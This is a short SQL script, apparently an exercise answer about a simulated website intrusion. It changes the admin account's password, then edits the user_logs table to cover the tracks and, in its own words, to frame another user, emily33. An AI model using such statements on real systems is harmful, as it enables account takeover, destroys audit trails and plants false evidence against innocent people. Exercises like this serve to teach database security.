
--Alter the password of the website’s administrative account, admin, to instead be “oops!”.
UPDATE "users" SET "password"='982c0381c279d139fd221fce974916e7'
WHERE "username"='admin';

--Add false data to throw others off your trail. In particular, to frame emily33, make it only appear—in the user_logs table—as if the admin account has had
-- its password changed to emily33’s password.

UPDATE "user_logs" SET "old_password"=(SELECT "new_password" FROM "user_logs" WHERE "new_username"='admin'),"new_password"=(SELECT "new_password" FROM "user_logs" WHERE "new_username"='emily33')
WHERE "new_username"='admin';


